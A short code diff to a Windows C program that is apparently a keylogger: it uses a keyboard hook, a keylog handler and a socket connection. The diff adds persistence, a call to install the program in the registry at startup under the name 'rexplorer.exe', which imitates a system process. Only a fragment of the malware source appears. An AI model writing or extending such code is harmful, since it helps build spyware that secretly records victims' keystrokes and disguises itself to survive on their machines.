@@ -10,6 +10,8 @@
 #include <winsock.h>
 #include <winuser.h>
 
+#define PROGRAM_NAME "\\rexplorer.exe"
+
 SOCKET server;
 HHOOK hook;
 int keylog_on = 1;
@@ -79,6 +81,7 @@ void *keylog_handler(void *vargp) {
 }
 
 int main() {
+  install_to_registry(PROGRAM_NAME);
   WSADATA wsa;
   if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
     LOG_ERR("init error: %d\n", WSAGetLastError());
